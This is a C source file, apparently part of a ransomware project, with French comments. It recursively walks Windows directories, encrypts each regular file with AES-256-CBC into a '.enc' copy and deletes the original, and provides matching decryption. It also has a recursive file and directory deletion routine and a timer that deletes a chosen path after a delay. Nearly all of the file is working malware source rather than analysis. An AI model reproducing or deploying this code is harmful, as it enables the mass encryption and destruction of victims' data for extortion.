#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <openssl/evp.h>
#include "ransomware.h"
#include <stdbool.h> 

#include <windows.h>
  
/**
 * Fonction auxiliaire pour vérifier si un fichier est régulier.
 *
 * @param path Chemin du fichier à vérifier.
 * @return 1 si le fichier est régulier, 0 sinon.
 */
int is_regular_file(const char *path) {
    struct stat file_stat;

    // Appel à stat() pour obtenir les informations sur le fichier
    if (stat(path, &file_stat) != 0) {
        // (Si stat échoue, cela signifie que le fichier n'existe pas ou qu'il y a une erreur)
        return 0; // fichier n'est pas régulier (ou n'existe pas)
    }

    // Vérification si le fichier est régulier (et non un répertoire, un lien symbolique, etc.)
    if (S_ISREG(file_stat.st_mode)) {
        return 1; // 1 signifie que c'est un fichier régulier
    }

    // Ce n'est pas un fichier régulier, retour 0
    return 0;
}


/**
 * Fonction auxiliaire pour vérifier si un chemin correspond à un répertoire.
 *
 * @param path Chemin à vérifier.
 * @return 1 si le chemin est un répertoire, 0 sinon.
 */ 
int is_directory(const char *path) {
    DWORD attrib = GetFileAttributes(path);
    return (attrib != INVALID_FILE_ATTRIBUTES && (attrib & FILE_ATTRIBUTE_DIRECTORY));
}


/**
 * Fonction pour construire le chemin d'accès complet d'un fichier.
 *
 * @param directory Chemin du répertoire parent.
 * @param file Nom du fichier.
 * @param full_path Buffer pour stocker le chemin complet.
 * @param size Taille du buffer full_path.
 */
void construct_path(const char *directory, const char *file, char *full_path, size_t size) {
    // Assurer que le chemin final ne dépasse pas la taille maximale
    snprintf(full_path, size, "%s\\%s", directory, file);
}

/**
 * Fonction pour lire et chiffrer/déchiffrer un répertoire et ses sous-répertoires.
 *
 * @param dir_path Chemin du répertoire à parcourir.
 * @param mode Mode d'opération : 0 pour chiffrer, 1 pour déchiffrer.
 * @param key Clé de chiffrement/déchiffrement (doit être de taille KEY_SIZE).
 * @param iv Vecteur d'initialisation (doit être de taille IV_SIZE).
 */
void read_and_crypt_directory(const char *dir_path, int mode, unsigned char *key, unsigned char *iv) {
    WIN32_FIND_DATA find_file_data;
    HANDLE hFind;

    // Construction du chemin de recherche 
    char search_path[1024];
    construct_path(dir_path, "*", search_path, sizeof(search_path));

    // Recherche des fichiers dans le répertoire
    hFind = FindFirstFile(search_path, &find_file_data);

    // Si l'ouverture du répertoire échoue, nous affichons une erreur
    if (hFind == INVALID_HANDLE_VALUE) {
        perror("FindFirstFile a échoué.");
        return;
    }

    // Nous parcourons le contenu du répertoire
    do {
        // Nous ignorons les répertoires "." et ".."
        if (strcmp(find_file_data.cFileName, ".") == 0 || strcmp(find_file_data.cFileName, "..") == 0) {
            continue;
        }

        // Nous construisons le chemin complet du fichier
        char full_path[1024];
        construct_path(dir_path, find_file_data.cFileName, full_path, sizeof(full_path));

        // Nous vérifions si c'est un fichier régulier
        if (is_regular_file(full_path)) {
            // Si c'est un fichier régulier 
            printf("Fichier trouvé : %s\n", full_path);

            // Si le mode est 0, on chiffre le fichier
            if (mode == 0) {
                encrypt_file(full_path, key, iv);
            }
            // Si le mode est 1, on déchiffre le fichier
            else if (mode == 1) {
                decrypt_file(full_path, key, iv);
            }
        }
        // Si c'est un répertoire, appeler récursivement read_and_crypt_directory pour explorer le sous-répertoire
        else if (is_directory(full_path)) {
            // Appel récursif pour les sous-répertoires
            read_and_crypt_directory(full_path, mode, key, iv); 
        }
    } while (FindNextFile(hFind, &find_file_data) != 0);

    // Ferme le répertoire
    FindClose(hFind);
}

/**
 * Fonction pour chiffrer un fichier.
 *
 * @param input_path Chemin du fichier à chiffrer.
 * @param key Clé de chiffrement (doit être de taille KEY_SIZE).
 * @param iv Vecteur d'initialisation (doit être de taille IV_SIZE).
 * @return 0 en cas de succès, -1 en cas d'erreur.
 */
int encrypt_file(const char *input_path, unsigned char *key, unsigned char *iv) {
    FILE *infile = fopen(input_path, "rb");
    if (!infile) {
        perror("Erreur lors de l'ouverture du fichier d'entrée");
        return -1;
    }

    // Préparation du fichier de sortie
    char output_path[1024];
    snprintf(output_path, sizeof(output_path), "%s.enc", input_path);
    FILE *outfile = fopen(output_path, "wb");
    if (!outfile) {
        perror("Erreur lors de l'ouverture du fichier de sortie");
        fclose(infile);
        return -1;
    }

    // Initialisation du contexte de chiffrement
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        fprintf(stderr, "Erreur d'initialisation du contexte AES.\n");
        fclose(infile);
        fclose(outfile);
        return -1;
    }

    // Initialisation de l'algorithme AES en mode CBC
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
        fprintf(stderr, "Erreur lors de l'initialisation de l'algorithme AES.\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        fclose(outfile);
        return -1;
    }

    // Chiffrement de la clé et de l'IV
    unsigned char encrypted_key[KEY_SIZE + AES_BLOCK_SIZE]; // Taille ajustée pour le padding d'Aes
    unsigned char encrypted_iv[IV_SIZE + AES_BLOCK_SIZE];   // Taille ajustée pour le padding d'Aes
    int encrypted_key_len, encrypted_iv_len;

    // Chiffrement de la clé
    if (EVP_EncryptUpdate(ctx, encrypted_key, &encrypted_key_len, key, KEY_SIZE) != 1) {
        fprintf(stderr, "Erreur lors du chiffrement de la clé.\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        fclose(outfile);
        return -1;
    }

    // Finalisation du chiffrement de la clé (pour gérer le padding)
    int final_len;
    if (EVP_EncryptFinal_ex(ctx, encrypted_key + encrypted_key_len, &final_len) != 1) {
        fprintf(stderr, "Erreur lors de la finalisation du chiffrement de la clé.\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        fclose(outfile);
        return -1;
    }
    encrypted_key_len += final_len;

    // Réinitialisation du contexte pour chiffrer l'IV
    EVP_CIPHER_CTX_reset(ctx);
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
        fprintf(stderr, "Erreur lors de la réinitialisation de l'algorithme AES.\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        fclose(outfile);
        return -1;
    }

    // Chiffrement de l'IV
    if (EVP_EncryptUpdate(ctx, encrypted_iv, &encrypted_iv_len, iv, IV_SIZE) != 1) {
        fprintf(stderr, "Erreur lors du chiffrement de l'IV.\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        fclose(outfile);
        return -1;
    }

    // Finalisation du chiffrement de l'IV (pour gérer le padding)
    if (EVP_EncryptFinal_ex(ctx, encrypted_iv + encrypted_iv_len, &final_len) != 1) {
        fprintf(stderr, "Erreur lors de la finalisation du chiffrement de l'IV.\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        fclose(outfile);
        return -1;
    }
    encrypted_iv_len += final_len;

    // Écriture de la clé et de l'IV chiffrés dans le fichier
    fwrite(&encrypted_key_len, sizeof(int), 1, outfile); // Taille de la clé chiffrée
    fwrite(&encrypted_iv_len, sizeof(int), 1, outfile);  // Taille de l'IV chiffré
    fwrite(encrypted_key, 1, encrypted_key_len, outfile);
    fwrite(encrypted_iv, 1, encrypted_iv_len, outfile);

    // Lecture, chiffrement et écriture du fichier par blocs
    unsigned char buffer_in[BUFFER_SIZE];
    unsigned char buffer_out[BUFFER_SIZE + AES_BLOCK_SIZE];
    int bytes_read, bytes_encrypted;

    while ((bytes_read = fread(buffer_in, 1, sizeof(buffer_in), infile)) > 0) {
        if (EVP_EncryptUpdate(ctx, buffer_out, &bytes_encrypted, buffer_in, bytes_read) != 1) {
            fprintf(stderr, "Erreur lors du chiffrement.\n");
            EVP_CIPHER_CTX_free(ctx);
            fclose(infile);
            fclose(outfile);
            return -1;
        }
        fwrite(buffer_out, 1, bytes_encrypted, outfile);
    }

    // Finalisation du chiffrement
    if (EVP_EncryptFinal_ex(ctx, buffer_out, &bytes_encrypted) != 1) {
        fprintf(stderr, "Erreur lors de la finalisation du chiffrement.\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        fclose(outfile);
        return -1;
    }
    fwrite(buffer_out, 1, bytes_encrypted, outfile);

    // Nettoyage
    EVP_CIPHER_CTX_free(ctx);
    fclose(infile);
    fclose(outfile);

    // Suppression de l'ancien fichier
    remove(input_path);

    printf("Fichier chiffré avec succès : %s\n", output_path);
    return 0;
}

/**
 * Fonction pour déchiffrer un fichier.
 *
 * @param input_path Chemin du fichier à déchiffrer.
 * @param key Clé de déchiffrement (doit être de taille KEY_SIZE).
 * @param iv Vecteur d'initialisation (doit être de taille IV_SIZE).
 * @return 0 en cas de succès, -1 en cas d'erreur, -2 si la clé ou l'IV est incorrect.
 */
int decrypt_file(const char *input_path, unsigned char *key, unsigned char *iv) {
    FILE *infile = fopen(input_path, "rb");
    if (!infile) {
        perror("Erreur lors de l'ouverture du fichier d'entrée");
        return -1;
    }

    // Préparation du fichier de sortie
    char output_path[1024];
    size_t len = strlen(input_path);
    // Si le fichier ne posséde pas l'ectention ".enc" on l'ignore
    if (len > 4 && strcmp(input_path + len - 4, ".enc") == 0) {
        snprintf(output_path, sizeof(output_path), "%.*s", (int)(len - 4), input_path);
    } else {
        printf("Fichier non chiffré, ignoré avec succès : %s\n", input_path);
        fclose(infile);
        return 0;
    }

    // Initialisation du contexte de déchiffrement
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        fprintf(stderr, "Erreur d'initialisation du contexte AES.\n");
        fclose(infile);
        return -1;
    }

    // Lecture des tailles de la clé et de l'IV chiffrés
    int encrypted_key_len, encrypted_iv_len;
    if (fread(&encrypted_key_len, sizeof(int), 1, infile) != 1) {
        fprintf(stderr, "Erreur lors de la lecture de la taille de la clé chiffrée.\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        return -1;
    }
    if (fread(&encrypted_iv_len, sizeof(int), 1, infile) != 1) {
        fprintf(stderr, "Erreur lors de la lecture de la taille de l'IV chiffré.\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        return -1;
    }

    // Lecture de la clé et de l'IV chiffrés
    unsigned char encrypted_key[encrypted_key_len];
    unsigned char encrypted_iv[encrypted_iv_len];
    if (fread(encrypted_key, 1, (size_t)encrypted_key_len, infile) != (size_t)encrypted_key_len) {
        fprintf(stderr, "Erreur lors de la lecture de la clé chiffrée.\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        return -1;
    }
    if (fread(encrypted_iv, 1, (size_t)encrypted_iv_len, infile) != (size_t)encrypted_iv_len) {
        fprintf(stderr, "Erreur lors de la lecture de l'IV chiffré.\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        return -1;
    }

    // Déchiffrement de la clé
    unsigned char decrypted_key[KEY_SIZE];
    int decrypted_key_len;
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
        fprintf(stderr, "Erreur lors de l'initialisation de l'algorithme AES.\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        return -1;
    }

    if (EVP_DecryptUpdate(ctx, decrypted_key, &decrypted_key_len, encrypted_key, encrypted_key_len) != 1) {
        fprintf(stderr, "Erreur lors du déchiffrement de la clé.\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        return -1;
    }

    // Finalisation du déchiffrement de la clé
    int final_len;
    if (EVP_DecryptFinal_ex(ctx, decrypted_key + decrypted_key_len, &final_len) != 1) {
        fprintf(stderr, "Erreur lors de la finalisation du déchiffrement de la clé.\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        return -1;
    }
    decrypted_key_len += final_len;

    // Réinitialisation du contexte pour déchiffrer l'IV
    EVP_CIPHER_CTX_reset(ctx);
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
        fprintf(stderr, "Erreur lors de la réinitialisation de l'algorithme AES.\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        return -1;
    }

    // Déchiffrement de l'IV
    unsigned char decrypted_iv[IV_SIZE];
    int decrypted_iv_len;
    if (EVP_DecryptUpdate(ctx, decrypted_iv, &decrypted_iv_len, encrypted_iv, encrypted_iv_len) != 1) {
        fprintf(stderr, "Erreur lors du déchiffrement de l'IV.\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        return -1;
    }

    // Finalisation du déchiffrement de l'IV
    if (EVP_DecryptFinal_ex(ctx, decrypted_iv + decrypted_iv_len, &final_len) != 1) {
        fprintf(stderr, "Erreur lors de la finalisation du déchiffrement de l'IV.\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        return -1;
    }
    decrypted_iv_len += final_len;

    // Comparaison de la clé et de l'IV déchiffrés avec ceux passés en argument
    if (memcmp(decrypted_key, key, KEY_SIZE) != 0 || memcmp(decrypted_iv, iv, IV_SIZE) != 0) {
        fprintf(stderr, "La clé ou l'IV ne correspond pas. Annulation du déchiffrement.\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        return -2; // Code d'erreur pour clé/IV incorrects
    }

    // Ouverture du fichier de sortie
    FILE *outfile = fopen(output_path, "wb");
    if (!outfile) {
        perror("Erreur lors de l'ouverture du fichier de sortie");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        return -1;
    }

    // Lecture, déchiffrement et écriture du fichier par blocs
    unsigned char buffer_in[BUFFER_SIZE + AES_BLOCK_SIZE];
    unsigned char buffer_out[BUFFER_SIZE];
    int bytes_read, bytes_decrypted;

    while ((bytes_read = fread(buffer_in, 1, sizeof(buffer_in), infile)) > 0) {
        if (EVP_DecryptUpdate(ctx, buffer_out, &bytes_decrypted, buffer_in, bytes_read) != 1) {
            fprintf(stderr, "Erreur lors du déchiffrement.\n");
            EVP_CIPHER_CTX_free(ctx);
            fclose(infile);
            fclose(outfile);
            return -1;
        }
        fwrite(buffer_out, 1, bytes_decrypted, outfile);
    }

    // Finalisation du déchiffrement
    if (EVP_DecryptFinal_ex(ctx, buffer_out, &bytes_decrypted) != 1) {
        fprintf(stderr, "Erreur lors de la finalisation du déchiffrement.\n");
        EVP_CIPHER_CTX_free(ctx);
        fclose(infile);
        fclose(outfile);
        return -1;
    }
    fwrite(buffer_out, 1, bytes_decrypted, outfile);

    // Nettoyage
    EVP_CIPHER_CTX_free(ctx);
    fclose(infile);
    fclose(outfile);

    // Suppression de l'ancien fichier chiffré
    remove(input_path);

    printf("Fichier déchiffré avec succès : %s\n", output_path);
    return 0;
}


/**
 * @brief Supprime un fichier ou un répertoire spécifié.
 * 
 * Cette fonction vérifie si le chemin donné représente un fichier ou un répertoire.
 * - Si c'est un fichier, il est supprimé.
 * - Si c'est un répertoire, la fonction supprime d'abord tous les fichiers et sous-répertoires à l'intérieur du répertoire de manière récursive, puis supprime le répertoire vide.
 * 
 * @param path Le chemin du fichier ou répertoire à supprimer. Ce chemin doit être un chemin absolu valide.
 * 
 * @note Si un fichier ou un répertoire est verrouillé ou en cours d'utilisation par un autre processus, la suppression échouera.
 */
void removeFileOrDirectory(const char *path) {
    DWORD file_attributes = GetFileAttributes(path);
    if (file_attributes == INVALID_FILE_ATTRIBUTES) {
        printf("Erreur : le fichier ou répertoire %s n'existe pas.\n", path);
        return;
    }

    // Si c'est un fichier, on le supprime
    if (!(file_attributes & FILE_ATTRIBUTE_DIRECTORY)) {
        if (DeleteFile(path)) {
            // printf("Le fichier %s a été supprimé avec succès.\n", path);
        } else {
            printf("Échec de la suppression du fichier %s.\n", path);
        }
    }
    // Si c'est un répertoire
    else {
        // Créer un handle pour le répertoire
        WIN32_FIND_DATA find_file_data;
        char search_path[MAX_PATH];
        snprintf(search_path, sizeof(search_path), "%s\\*", path); // S'assurer que le chemin est bien formé

        HANDLE hFind = FindFirstFile(search_path, &find_file_data);
        
        if (hFind == INVALID_HANDLE_VALUE) {
            printf("Erreur : impossible d'ouvrir le répertoire %s.\n", path);
            return;
        }

        // Ignorer le "." et ".." pour ne pas supprimer ces répertoires spéciaux
        do {
            const char *file_or_dir = find_file_data.cFileName;
            char full_path[MAX_PATH];
            snprintf(full_path, sizeof(full_path), "%s\\%s", path, file_or_dir);

            // Appel récursif pour supprimer les fichiers ou sous-répertoires
            if (strcmp(file_or_dir, ".") != 0 && strcmp(file_or_dir, "..") != 0) {
                removeFileOrDirectory(full_path);
            }
        } while (FindNextFile(hFind, &find_file_data));

        // Fermeture du handle et suppression du répertoire vide
        FindClose(hFind);
        if (RemoveDirectory(path)) {
            // printf("Le répertoire %s a été supprimé avec succès.\n", path);
        } else {
            printf("Échec de la suppression du répertoire %s.\n", path);
        }
    }
}

/**
 * Fonction de rappel (callback) appelée lorsque le timer atteint son délai.
 * Cette fonction tente de supprimer le fichier spécifié.
 *
 * @param lpArg Pointeur vers le chemin du fichier à supprimer.
 * @param dwTimerLowValue Valeur basse du timer.
 * @param dwTimerHighValue Valeur haute du timer.
 */
void CALLBACK TimerCallback(LPVOID lpArg, DWORD dwTimerLowValue, DWORD dwTimerHighValue) {
    const char *file_path = (const char *)lpArg; 
    printf("\nSignal reçu : suppression du fichier en cours... %s\n", file_path); 
    removeFileOrDirectory(file_path);
}

/**
 * Fonction pour planifier la suppression d'un fichier après un délai spécifié.
 * Un timer Windows est utilisé pour appeler la fonction de suppression après le délai.
 *
 * @param file_path Chemin du fichier à supprimer.
 * @param wait_time_seconds Délai en secondes avant que le fichier soit supprimé.
 */
void scheduleFileDeletion(const char *file_path, int wait_time_seconds) {
    // Création d'un timer unique
    HANDLE timer = CreateWaitableTimer(NULL, FALSE, NULL);
    if (!timer) {
        printf("Erreur : impossible de créer le timer.\n");
        return;
    }

    // Configurer le délai en secondes (convertir en 100 nanosecondes)
    LARGE_INTEGER due_time;
    due_time.QuadPart = -(LONGLONG)wait_time_seconds * 10000000LL; // Conversion en 100 ns
    printf("Temps d'attente : %lld LL\n", due_time.QuadPart);
    // Configurer le timer pour appeler une fonction callback 
    if (!SetWaitableTimer(timer, &due_time, 0, TimerCallback, (LPVOID)file_path, FALSE)) {
        printf("Erreur : impossible de configurer le timer.\n");
        CloseHandle(timer);
        return;
    }

    // Libération des ressources (jamais atteinte ici)
    CloseHandle(timer);
}